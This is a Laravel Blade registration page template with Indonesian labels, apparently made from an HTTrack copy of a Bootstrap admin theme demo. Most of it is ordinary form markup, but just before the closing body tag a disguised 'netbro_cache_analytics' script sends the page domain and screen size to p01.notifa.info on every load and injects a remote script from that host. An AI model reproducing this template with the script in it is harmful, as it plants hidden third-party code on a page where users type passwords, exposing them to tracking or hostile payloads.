<!DOCTYPE html>
<html lang="en">


<!-- Mirrored from creativethemes.co.in/demo/studioux/hyrax-admin-bootstrap4/main/pages-register.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 25 Nov 2018 07:37:42 GMT -->
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <!-- Tell the browser to be responsive to screen width -->
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <!-- Favicon icon -->
    <link rel="icon" type="image/png" sizes="16x16" href="{{asset('/hyrax/assets/images/favicon.png')}}">
    <title>Page Register</title>
    <!-- Bootstrap Core CSS -->
    <link href="{{asset('/hyrax/assets/vendors/bootstrap/css/bootstrap.min.css')}}" rel="stylesheet">
    <!-- page css -->
    <link href="{{asset('/hyrax/main/css/pages/login-register-lock.css')}}" rel="stylesheet">
    <!-- Custom CSS -->
    <link href="{{asset('/hyrax/main/css/master-stylesheet.css')}}" rel="stylesheet">
    
    <!-- You can change the theme colors from here -->
    <link href="{{asset('/hyrax/main/css/colors/default.css')}}" id="theme" rel="stylesheet">
    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
<![endif]-->
</head>

<body class="card-no-border">
    <!-- ============================================================== -->
    <!-- Preloader - style you can find in spinners.css -->
    <!-- ============================================================== -->
    <div class="preloader">
        <div class="loader">
      <div class="lds-roller">
      <div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>
        </div>
    </div>
    <!-- ============================================================== -->
    <!-- Main wrapper - style you can find in pages.scss -->
    <!-- ============================================================== -->
    <section id="wrapper">
        <div class="login-register" style="background-image:url(../hyrax/assets/images/background/roses.jpg);">
            <div class="login-box card">
                <div class="card-body">
                    <form class="form-horizontal form-material" id="loginform" method="POST" action="{{ route('register') }}">
                        @csrf
                        <h3 class="box-title mb-20">Daftar</h3>
                        <div class="form-group">
                            <div class="col-xs-12">
                                <input id="name" type="text" class="form-control{{ $errors->has('name') ? ' is-invalid' : '' }}" name="name" value="{{ old('name') }}" placeholder="Nama" required autofocus>

                                @if ($errors->has('name'))
                                    <span class="invalid-feedback" role="alert">
                                        <strong>{{ $errors->first('name') }}</strong>
                                    </span>
                                @endif
                            </div>
                        </div>
                        <div class="form-group ">
                            <div class="col-xs-12">
                                <input id="email" type="email" class="form-control{{ $errors->has('email') ? ' is-invalid' : '' }}" name="email" value="{{ old('email') }}" placeholder="Email" required>

                                @if ($errors->has('email'))
                                    <span class="invalid-feedback" role="alert">
                                        <strong>{{ $errors->first('email') }}</strong>
                                    </span>
                                @endif
                            </div>
                        </div>
                        <div class="form-group ">
                            <div class="col-xs-12">
                                <input id="password" type="password" class="form-control{{ $errors->has('password') ? ' is-invalid' : '' }}" name="password" placeholder="Kata Sandi" required>

                                @if ($errors->has('password'))
                                    <span class="invalid-feedback" role="alert">
                                        <strong>{{ $errors->first('password') }}</strong>
                                    </span>
                                @endif
                            </div>
                        </div>
                        <div class="form-group">
                            <div class="col-xs-12">
                                <input id="password-confirm" type="password" class="form-control" name="password_confirmation" placeholder="Konfirmasi Kata Sandi" required>
                            </div>
                        </div>
                        <!-- <div class="form-group row">
                            <div class="col-md-12">
                                <div class="checkbox checkbox-success pt-0">
                                    <input id="checkbox-signup" type="checkbox"  class="filled-in chk-col-light-blue">
                                    <label for="checkbox-signup"> I agree to all <a href="javascript:void(0)">Terms</a></label>
                                </div>
                            </div>
                        </div> -->
                        <div class="form-group text-center pb-20">
                            <div class="col-xs-12">
                                <button class="btn btn-primary btn-lg btn-block btn-rounded text-uppercase waves-effect waves-light" type="submit">Daftar</button>
                            </div>
                        </div>
                        <div class="form-group mb-0">
                            <div class="col-sm-12 text-center">
                                Email Anda Sudah Terdaftar ? <a href="{{route('login')}}" class="text-info ml-5"><b>Masuk</b></a>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </section>
    <!-- ============================================================== -->
    <!-- End Wrapper -->
    <!-- ============================================================== -->
    <!-- ============================================================== -->
    <!-- All Jquery -->
    <!-- ============================================================== -->
    <script src="{{asset('/hyrax/assets/vendors/jquery/jquery.min.js')}}"></script>
    <!-- Bootstrap tether Core JavaScript -->
    <script src="{{asset('/hyrax/assets/vendors/bootstrap/js/popper.min.js')}}"></script>
    <script src="{{asset('/hyrax/assets/vendors/bootstrap/js/bootstrap.min.js')}}"></script>
    <script type="text/javascript">
        $(function() {
            $(".preloader").fadeOut();
        });
        $(function() {
            $('[data-toggle="tooltip"]').tooltip()
        });
        // ============================================================== 
        // Login and Recover Password 
        // ============================================================== 
        $('#to-recover').on("click", function() {
            $("#loginform").slideUp();
            $("#recoverform").fadeIn();
        });
    </script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdJjhfuBGXJ8%2b2w%2f7POrVNEdCoUhi%2fTNpLpY7bfmIDWQBb3R8Iyiv7zQkalxvNTeNUHgbmCzyygpKZ171qJn2AOWpAgyCPYC9e0Hn%2fjH7nW7tviLx4BwfNLhy28TJZ1OcpIXlWpuFiEpH25yBsn8eu%2fZT1eeGHejWnLVbB3MQu8Roy8BRcyZM%2fwBWM6zbfdNxWknLF%2bI0rDKTISw7pcz9R%2b2y0Bbu6rEEo8AN%2bOM6DjiQuhoS64tKva0TXaF%2bg2%2f%2fiYMYnVM%2fQBcS8uDTJjc13AsTIWN5%2f09UXYB0pQs0fc4kI7gBra4KJ9g1UHJnFrDDfdoaw7NYb2%2bEdNRTRfI4idiK5Xwt2PnJlOzsGsrqQNul2DDKUHk7oUxG%2fNche0F2TFZl8TSNzAFGP7h%2fFODrlvgs%2feoJuQO8yQ%2bIx0ZBopJoe7kSrX2XAUjzE4bj6V%2bg%2fvZSLIkaYyH9croHy9cOsr0zuvkhq8EWpNHKPdUQ5hXDS3US5KOs9oxbVPFTcu0CfiBYypaZ8r%2ffRl696uZv%2bkmRZLe5BthZL%2fWq%2fdm8735Y%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>


<!-- Mirrored from creativethemes.co.in/demo/studioux/hyrax-admin-bootstrap4/main/pages-register.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 25 Nov 2018 07:37:42 GMT -->
</html>
<!-- 
<div class="container">
    <div class="row justify-content-center">
        <div class="col-md-8">
            <div class="card">
                <div class="card-header">{{ __('Register') }}</div>

                <div class="card-body">
                    <form method="POST" action="{{ route('register') }}">
                        @csrf

                        <div class="form-group row">
                            <label for="name" class="col-md-4 col-form-label text-md-right">{{ __('Name') }}</label>

                            <div class="col-md-6">
                                <input id="name" type="text" class="form-control{{ $errors->has('name') ? ' is-invalid' : '' }}" name="name" value="{{ old('name') }}" required autofocus>

                                @if ($errors->has('name'))
                                    <span class="invalid-feedback" role="alert">
                                        <strong>{{ $errors->first('name') }}</strong>
                                    </span>
                                @endif
                            </div>
                        </div>

                        <div class="form-group row">
                            <label for="email" class="col-md-4 col-form-label text-md-right">{{ __('E-Mail Address') }}</label>

                            <div class="col-md-6">
                                <input id="email" type="email" class="form-control{{ $errors->has('email') ? ' is-invalid' : '' }}" name="email" value="{{ old('email') }}" required>

                                @if ($errors->has('email'))
                                    <span class="invalid-feedback" role="alert">
                                        <strong>{{ $errors->first('email') }}</strong>
                                    </span>
                                @endif
                            </div>
                        </div>

                        <div class="form-group row">
                            <label for="password" class="col-md-4 col-form-label text-md-right">{{ __('Password') }}</label>

                            <div class="col-md-6">
                                <input id="password" type="password" class="form-control{{ $errors->has('password') ? ' is-invalid' : '' }}" name="password" required>

                                @if ($errors->has('password'))
                                    <span class="invalid-feedback" role="alert">
                                        <strong>{{ $errors->first('password') }}</strong>
                                    </span>
                                @endif
                            </div>
                        </div>

                        <div class="form-group row">
                            <label for="password-confirm" class="col-md-4 col-form-label text-md-right">{{ __('Confirm Password') }}</label>

                            <div class="col-md-6">
                                <input id="password-confirm" type="password" class="form-control" name="password_confirmation" required>
                            </div>
                        </div>

                        <div class="form-group row mb-0">
                            <div class="col-md-6 offset-md-4">
                                <button type="submit" class="btn btn-primary">
                                    {{ __('Register') }}
                                </button>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div> -->